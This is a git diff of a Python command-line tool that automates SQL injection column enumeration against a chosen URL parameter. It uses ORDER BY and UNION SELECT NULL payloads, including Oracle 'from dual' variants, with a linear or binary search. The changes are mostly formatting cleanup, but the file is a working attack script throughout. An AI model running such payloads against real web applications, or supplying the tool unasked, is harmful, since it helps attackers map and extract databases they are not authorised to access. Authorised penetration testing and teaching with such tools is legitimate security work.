@@ -1,10 +1,10 @@
 import requests
 import urllib
 import argparse
-from colorama import Fore, Back, Style
+from colorama import Style, Fore
 
 
-class AmountOfColumnsFinder():
+class AmountOfColumnsFinder:
     __amount_of_columns = 0
     __url = ''
     __db_exploit = ''
@@ -29,7 +29,7 @@ class AmountOfColumnsFinder():
             self.print_red("[-] Wrong method!")
             exit()
 
-        try: 
+        try:
             if amount_of_columns <= 0:
                 self.print_red("[-] Amount of columns has to be greater then 0.\n[*] Exiting...")
                 exit()
@@ -37,22 +37,20 @@ class AmountOfColumnsFinder():
             self.print_red("[-] Amount of columns has to be greater then 0.\n[*] Exiting...")
             exit()
 
-
     ''' Run '''
+
     # Do przebudowania
     def queue_method(self):
         for i in range(self.__amount_of_columns):
             db_code = self.make_request_db()
             oracle_code = self.make_request_oracle()
             if db_code == 200 or oracle_code == 200:
-            # if '200' in self.make_request():
-                self.print_green(f'[+] Amount of columns: {i+1}')
+                self.print_green(f'[+] Amount of columns: {i + 1}')
                 exit()
             self.add_nulls()
-            
+
         self.print_red('[-] Amount of columns not found.')
         exit()
-
 
     ''' 
     ##################################################################################################################
@@ -65,16 +63,17 @@ class AmountOfColumnsFinder():
     '''
 
     ''' Binary search algoruthm methods '''
+
     def binary_search_method(self) -> None:
         self.bs_payload()
         previous = self.__amount_of_columns
-        self.__bs_orderby_int = int(self.__amount_of_columns/2) + int(self.__amount_of_columns%2)
+        self.__bs_orderby_int = int(self.__amount_of_columns / 2) + int(self.__amount_of_columns % 2)
         db_resp = 0
         oracle_resp = 0
         while True:
             self.bs_payload()
-            additional_arg = self.__bs_orderby_int%2
-            
+            additional_arg = self.__bs_orderby_int % 2
+
             code1 = self.make_request_db()
             code2 = self.make_request_oracle()
 
@@ -84,13 +83,13 @@ class AmountOfColumnsFinder():
                 exit()
             elif code1 != 200 and code2 != 200:
                 tmp_previous = self.__bs_orderby_int
-                self.__bs_orderby_int -= int(abs(previous-self.__bs_orderby_int)/2) + additional_arg
+                self.__bs_orderby_int -= int(abs(previous - self.__bs_orderby_int) / 2) + additional_arg
                 previous = tmp_previous
             else:
                 tmp_previous = self.__bs_orderby_int
-                self.__bs_orderby_int = int(abs(previous-self.__bs_orderby_int)/2) + additional_arg + self.__bs_orderby_int
+                self.__bs_orderby_int = int(
+                    abs(previous - self.__bs_orderby_int) / 2) + additional_arg + self.__bs_orderby_int
                 previous = tmp_previous
-            
 
     def is_equal(self, code1, code2) -> bool:
         if code1 == 200 or code2 == 200:
@@ -104,7 +103,7 @@ class AmountOfColumnsFinder():
     def bs_payload(self) -> None:
         tmp_request = '\' order by '
         comment = '-- -'
-        self.__db_exploit = tmp_request + str(self.__bs_orderby_int) + comment 
+        self.__db_exploit = tmp_request + str(self.__bs_orderby_int) + comment
 
     def bs_request(self, final_url) -> str:
         response = requests.get(final_url)
@@ -128,7 +127,6 @@ class AmountOfColumnsFinder():
     ##################################################################################################################
     '''
 
-
     def run(self):
         if self.__method == 1:
             self.queue_method()
@@ -147,13 +145,14 @@ class AmountOfColumnsFinder():
         self.show_data()
         self.configure_exploit()
         self.add_nulls()
-        self.show_data() 
+        self.show_data()
 
     ''' Data '''
+
     def configure_params(self, param_name, params_values):
         if len(param_name) != len(params_values):
             self.print_red('[-] Error occurred!. Amount of parameters names is different from amount of values!')
-            self.print_red( '[*] Exiting... ')
+            self.print_red('[*] Exiting... ')
             exit()
         for i in range(0, len(param_name)):
             self.__params_dict[param_name[i]] = params_values[i]
@@ -165,12 +164,13 @@ class AmountOfColumnsFinder():
         self.print_red(f'DB oracle exploit: {self.__oracle_exploit}')
 
     ''' Actual script '''
-    def make_request_db(self)->str:
+
+    def make_request_db(self) -> str:
         # print(Fore.RED, self.encode_db_url(), Style.RESET_ALL)
         response = requests.get(self.encode_db_url())
         return response.status_code
-    
-    def make_request_oracle(self)->str:
+
+    def make_request_oracle(self) -> str:
         response = requests.get(self.encode_oracle_url())
         return response.status_code
         # return str(response_oracle.status_code)+str(response_db.status_code)
@@ -182,16 +182,15 @@ class AmountOfColumnsFinder():
         return url_to_encode
 
     def encode_db_url(self) -> str:
-        ''' Url encoding for a non oracle db'''
+        ''' Url encoding for a non oracle db '''
         complete_db_url = self.__url
         complete_oracle_url = self.__url
         complete_db_url += self.__param_name + '=' + urllib.parse.quote(self.__db_exploit)
         complete_oracle_url += self.__param_name + '=' + urllib.parse.quote(self.__oracle_exploit)
-        
+
         if '%27' in complete_db_url:
             complete_db_url = complete_db_url.replace('%27', '\'')
         return complete_db_url
-        
 
     def encode_oracle_url(self):
         ''' Url encoding for an oracle db '''
@@ -202,7 +201,6 @@ class AmountOfColumnsFinder():
             complete_oracle_url = complete_oracle_url.replace('%27', '\'')
         return complete_oracle_url
 
-
     def configure_exploit(self):
         dbnull = 'null'
         oracle_null = 'null from dual'
@@ -210,17 +208,16 @@ class AmountOfColumnsFinder():
         exploit_db = f'\' and 1=0 union select -- -'
         exploit_oracle_db = f'\' and 1=0 union select -- -'
 
-        self.__oracle_exploit = exploit_db[:-4]  + oracle_null + comment
-        self.__db_exploit = exploit_oracle_db[:-4]  + dbnull + comment
+        self.__oracle_exploit = exploit_db[:-4] + oracle_null + comment
+        self.__db_exploit = exploit_oracle_db[:-4] + dbnull + comment
 
     def add_nulls(self):
         dbnull = ',null'
-        oracle_null = ',null from dual' # 10
+        oracle_null = ',null from dual'  # 10
         comment = '-- -'
 
-        self.__db_exploit = self.__db_exploit[:-4] + dbnull  + comment
+        self.__db_exploit = self.__db_exploit[:-4] + dbnull + comment
         self.__oracle_exploit = self.__oracle_exploit[:-14] + oracle_null + comment
-
 
     def print_red(self, message):
         print(Fore.RED, message, Style.RESET_ALL)
@@ -229,17 +226,15 @@ class AmountOfColumnsFinder():
         print(Fore.GREEN, message, Style.RESET_ALL)
 
 
-    
-
-
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Finding amount of columns.')
     parser.add_argument('--url', '-u', type=str, nargs=1, help='Provide a clean url without any parameters.')
-    parser.add_argument('--param_name', '-pn', nargs=1, type=str, help='Provide names of parameters and then remeber to add values For parameters. For more help type python3 <filename> --help.\n')
+    parser.add_argument('--param_name', '-pn', nargs=1, type=str,
+                        help='Provide names of parameters and then remeber to add values For parameters. For more help type python3 <filename> --help.\n')
     parser.add_argument('--amount_of_columns', '-ac', nargs=1, type=int, help='Please provide a number of columns.')
-    parser.add_argument('--method', '-m', type=int, nargs=1, help='Please provide the methos: binary search (1) or brute search (2)')
+    parser.add_argument('--method', '-m', type=int, nargs=1,
+                        help='Please provide the methos: binary search (1) or brute search (2)')
     args = parser.parse_args()
-
 
     # bs = AmountOfColumns(args.url[0], args.param_name[0], args.amount_of_columns[0], args.method[0])
     bs = AmountOfColumnsFinder(args.url[0], args.param_name[0], args.amount_of_columns[0])
